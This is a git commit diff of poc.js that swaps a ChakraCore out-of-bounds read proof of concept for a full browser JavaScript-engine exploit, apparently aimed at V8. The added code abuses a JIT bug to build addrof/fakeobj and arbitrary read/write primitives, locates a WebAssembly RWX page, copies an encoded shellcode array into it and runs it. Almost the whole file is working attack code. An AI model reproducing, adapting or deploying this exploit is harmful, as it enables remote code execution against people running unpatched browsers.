9be1e3eef79800fc14cddd25204bdb19329613b9
nihadrekany <30975802+nihadrekany@users.noreply.github.com>
2021-07-25 20:32:30 +0300

    Update poc.js

--- poc.js
+++ poc.js
@@ -1,70 +1,121 @@
-// OOB read leak by bkth from phoenhex for ChakraCore, this will crash reading oob in edge
-var convert = new ArrayBuffer(0x100);
-var u32 = new Uint32Array(convert);
-var f64 = new Float64Array(convert);
+/*
+BSD 2-Clause License
+Copyright (c) 2021, rajvardhan agarwal
+All rights reserved.
+Redistribution and use in source and binary forms, with or without
+modification, are permitted provided that the following conditions are met:
+1. Redistributions of source code must retain the above copyright notice, this
+   list of conditions and the following disclaimer.
+2. Redistributions in binary form must reproduce the above copyright notice,
+   this list of conditions and the following disclaimer in the documentation
+   and/or other materials provided with the distribution.
+THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
+AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
+IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
+DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
+FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
+DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
+SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
+CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
+OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
+OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+*/
 
-var scratch = new ArrayBuffer(0x100000);
-var scratch_u8 = new Uint8Array(scratch);
-var scratch_u32 = new Uint32Array(scratch);
-var BASE = 0x100000000;
+var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11])
+var wasm_mod = new WebAssembly.Module(wasm_code);
+var wasm_instance = new WebAssembly.Instance(wasm_mod);
+var f = wasm_instance.exports.main;
 
-var shellcode = null;
+var buf = new ArrayBuffer(8);
+var f64_buf = new Float64Array(buf);
+var u64_buf = new Uint32Array(buf);
+let buf2 = new ArrayBuffer(0x150);
 
-function hex(x) {
-    return `0x${x.toString(16)}`
+function ftoi(val) {
+    f64_buf[0] = val;
+    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
 }
 
-function bytes_to_u64(bytes) {
-    return (bytes[0]+bytes[1]*0x100+bytes[2]*0x10000+bytes[3]*0x1000000
-        +bytes[4]*0x100000000+bytes[5]*0x10000000000);
+function itof(val) {
+    u64_buf[0] = Number(val & 0xffffffffn);
+    u64_buf[1] = Number(val >> 32n);
+    return f64_buf[0];
 }
 
-function i2f(x) {
-    u32[0] = x % BASE;
-    u32[1] = (x - (x % BASE)) / BASE;
-    return f64[0];
+const _arr = new Uint32Array([2**31]);
+
+function foo(a) {
+    var x = 1;
+	x = (_arr[0] ^ 0) + 1;
+
+	x = Math.abs(x);
+	x -= 2147483647;
+	x = Math.max(x, 0);
+
+	x -= 1;
+	if(x==-1) x = 0;
+
+	var arr = new Array(x);
+	arr.shift();
+	var cor = [1.1, 1.2, 1.3];
+
+	return [arr, cor];
 }
 
-function f2i(x) {
-    f64[0] = x;
-    return u32[0] + BASE * u32[1];
+for(var i=0;i<0x3000;++i)
+    foo(true);
+
+var x = foo(false);
+var arr = x[0];
+var cor = x[1];
+
+const idx = 6;
+arr[idx+10] = 0x4242;
+
+function addrof(k) {
+    arr[idx+1] = k;
+    return ftoi(cor[0]) & 0xffffffffn;
 }
 
-function valid_pointer(x) {
-    f64[0] = x;
-    if (u32[1] > 0 && u32[1] < 0x1000) {
-        return true;
+function fakeobj(k) {
+    cor[0] = itof(k);
+    return arr[idx+1];
+}
+
+var float_array_map = ftoi(cor[3]);
+
+var arr2 = [itof(float_array_map), 1.2, 2.3, 3.4];
+var fake = fakeobj(addrof(arr2) + 0x20n);
+
+function arbread(addr) {
+    if (addr % 2n == 0) {
+        addr += 1n;
     }
-    return false
+    arr2[1] = itof((2n << 32n) + addr - 8n);
+    return (fake[0]);
 }
 
-function opt(o, j) {
-    var a = new Float64Array(0x111112);
-    o = a;
-    o[0] = 1337; 
-    var b = a.slice(0,20); 
-    b[92] = 13; 
-    for (var i = 0; i < a.length; ++i) {
-        b = a;
-        b[1] = 0x4141;
+function arbwrite(addr, val) {
+    if (addr % 2n == 0) {
+        addr += 1n;
     }
-    // Chakra failed to insert value compensation which cause the headSegmentsym to be reloaded
-    // but not the headSegmentLength sym, we therefore accessed the new buffer with the wrong length checked
-    return b[j];  
+    arr2[1] = itof((2n << 32n) + addr - 8n);
+    fake[0] = itof(BigInt(val));
 }
 
-function pwn() {
-    for (var i = 0; i < 300; i++) {
-        opt(24, 0x10);
-    }
+function copy_shellcode(addr, shellcode) {
+    let dataview = new DataView(buf2);
+    let buf_addr = addrof(buf2);
+    let backing_store_addr = buf_addr + 0x14n;
+    arbwrite(backing_store_addr, addr);
 
-    for (var i = 0x10; i < 0x1000; ++i) {
-        let res = opt(24, i);
-        if (res != 0 && valid_pointer(res)) {
-            val = f2i(res);
-            print("Leaked at " + i + ": " + hex(val));
-        }
+    for (let i = 0; i < shellcode.length; i++) {
+        dataview.setUint32(4*i, shellcode[i], true);
     }
-    opt(24, 0x111111); // OOB
 }
-pwn();
+
+var rwx_page_addr = ftoi(arbread(addrof(wasm_instance) + 0x68n));
+console.log("[+] Address of rwx page: " + rwx_page_addr.toString(16));
+var shellcode = [3833809148,12642544,1363214336,1364348993,3526445142,1384859749,1384859744,1384859672,1921730592,3071232080,827148874,3224455369,2086747308,1092627458,1091422657,3991060737,1213284690,2334151307,21511234,2290125776,1207959552,1735704709,1355809096,1142442123,1226850443,1457770497,1103757128,1216885899,827184641,3224455369,3384885676,3238084877,4051034168,608961356,3510191368,1146673269,1227112587,1097256961,1145572491,1226588299,2336346113,21530628,1096303056,1515806296,1497454657,2202556993,1379999980,1096343807,2336774745,4283951378,1214119935,442,0,2374846464,257,2335291969,3590293359,2729832635,2797224278,4288527765,3296938197,2080783400,3774578698,1203438965,1785688595,2302761216,1674969050,778267745,6649957];
+copy_shellcode(rwx_page_addr, shellcode);
+f();
